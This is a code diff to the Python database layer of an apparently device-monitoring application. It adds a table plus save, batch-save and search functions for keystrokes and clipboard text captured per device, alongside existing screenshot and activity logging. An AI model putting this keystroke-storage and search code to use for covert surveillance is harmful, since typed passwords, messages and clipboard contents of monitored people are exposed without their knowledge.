@@ -116,10 +116,23 @@ def init_db():
         captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
     );
 
+    CREATE TABLE IF NOT EXISTS keystroke_logs (
+        id BIGSERIAL PRIMARY KEY,
+        device_id INT REFERENCES devices(id) ON DELETE CASCADE,
+        process_name VARCHAR(100),
+        window_title TEXT,
+        category_name VARCHAR(50) DEFAULT 'Other',
+        content TEXT NOT NULL,
+        log_type VARCHAR(30) DEFAULT 'keystroke',
+        character_count INT DEFAULT 0,
+        recorded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+    );
+
     CREATE INDEX IF NOT EXISTS idx_activity_device_time ON activity_logs (device_id, recorded_at);
     CREATE INDEX IF NOT EXISTS idx_activity_process ON activity_logs (process_name);
     CREATE INDEX IF NOT EXISTS idx_alerts_device_time ON system_alerts (device_id, created_at DESC);
     CREATE INDEX IF NOT EXISTS idx_screenshots_device_time ON screenshots (device_id, captured_at DESC);
+    CREATE INDEX IF NOT EXISTS idx_keystrokes_device_time ON keystroke_logs (device_id, recorded_at DESC);
     """)
 
     # Seed categories
@@ -550,6 +563,122 @@ def check_and_clear_screenshot_request():
         set_setting("pending_screenshot_request", "false")
         return True
     return False
+
+def save_keystroke_log(device_id, process_name, window_title, category_name, content, log_type="keystroke", recorded_at=None):
+    """Saves a single typed text or clipboard entry into PostgreSQL with auto-pruning."""
+    if not content or not content.strip():
+        return None
+    char_count = len(content)
+    with get_db() as conn:
+        with conn.cursor() as cur:
+            if recorded_at:
+                cur.execute("""
+                    INSERT INTO keystroke_logs (device_id, process_name, window_title, category_name, content, log_type, character_count, recorded_at)
+                    VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
+                    RETURNING id;
+                """, (device_id, process_name, window_title, category_name, content, log_type, char_count, recorded_at))
+            else:
+                cur.execute("""
+                    INSERT INTO keystroke_logs (device_id, process_name, window_title, category_name, content, log_type, character_count)
+                    VALUES (%s, %s, %s, %s, %s, %s, %s)
+                    RETURNING id;
+                """, (device_id, process_name, window_title, category_name, content, log_type, char_count))
+            row = cur.fetchone()
+            log_id = row[0] if row else None
+
+            # Bounded auto-pruning to keep DB light
+            cur.execute("""
+                DELETE FROM keystroke_logs
+                WHERE id IN (
+                    SELECT id FROM keystroke_logs
+                    WHERE device_id = %s
+                    ORDER BY recorded_at DESC
+                    OFFSET %s
+                );
+            """, (device_id, config.KEYSTROKE_MAX_STORED))
+            conn.commit()
+            return log_id
+
+def save_keystroke_batch(device_id, batch):
+    """Saves a batch of keystroke/clipboard entries [(process_name, window_title, category_name, content, log_type, recorded_at), ...]"""
+    if not batch:
+        return 0
+    valid_batch = [item for item in batch if item[3] and item[3].strip()]
+    if not valid_batch:
+        return 0
+    with get_db() as conn:
+        with conn.cursor() as cur:
+            for item in valid_batch:
+                pname = item[0]
+                title = item[1]
+                cat = item[2] if len(item) > 2 else "Other"
+                content = item[3]
+                ltype = item[4] if len(item) > 4 else "keystroke"
+                rec_at = item[5] if len(item) > 5 else None
+                char_count = len(content)
+                if rec_at:
+                    cur.execute("""
+                        INSERT INTO keystroke_logs (device_id, process_name, window_title, category_name, content, log_type, character_count, recorded_at)
+                        VALUES (%s, %s, %s, %s, %s, %s, %s, %s);
+                    """, (device_id, pname, title, cat, content, ltype, char_count, rec_at))
+                else:
+                    cur.execute("""
+                        INSERT INTO keystroke_logs (device_id, process_name, window_title, category_name, content, log_type, character_count)
+                        VALUES (%s, %s, %s, %s, %s, %s, %s);
+                    """, (device_id, pname, title, cat, content, ltype, char_count))
+
+            # Bounded auto-pruning
+            cur.execute("""
+                DELETE FROM keystroke_logs
+                WHERE id IN (
+                    SELECT id FROM keystroke_logs
+                    WHERE device_id = %s
+                    ORDER BY recorded_at DESC
+                    OFFSET %s
+                );
+            """, (device_id, config.KEYSTROKE_MAX_STORED))
+            conn.commit()
+            return len(valid_batch)
+
+def get_recent_keystroke_logs(device_id, limit=50, search_query=None, log_type=None):
+    """Retrieves recent keystroke/clipboard logs with search and filter capabilities."""
+    with get_db() as conn:
+        with conn.cursor(cursor_factory=RealDictCursor) as cur:
+            query = """
+                SELECT id, device_id, process_name, window_title, category_name, content, log_type, character_count, recorded_at
+                FROM keystroke_logs
+                WHERE device_id = %s
+            """
+            params = [device_id]
+            if log_type:
+                query += " AND log_type = %s"
+                params.append(log_type)
+            if search_query and search_query.strip():
+                query += " AND (content ILIKE %s OR window_title ILIKE %s OR process_name ILIKE %s)"
+                term = f"%{search_query.strip()}%"
+                params.extend([term, term, term])
+            query += " ORDER BY recorded_at DESC LIMIT %s;"
+            params.append(limit)
+
+            cur.execute(query, tuple(params))
+            rows = cur.fetchall()
+            results = []
+            for r in rows:
+                ts = r["recorded_at"]
+                results.append({
+                    "id": r["id"],
+                    "device_id": r["device_id"],
+                    "process_name": r["process_name"] or "unknown",
+                    "window_title": r["window_title"] or "",
+                    "category_name": r["category_name"] or "Other",
+                    "content": r["content"],
+                    "log_type": r["log_type"] or "keystroke",
+                    "character_count": r["character_count"],
+                    "recorded_at": ts.isoformat() if ts else "",
+                    "time_str": ts.strftime("%I:%M %p") if ts else "",
+                    "date_str": ts.strftime("%Y-%m-%d") if ts else ""
+                })
+            return results
 
 if __name__ == "__main__":
     init_db()
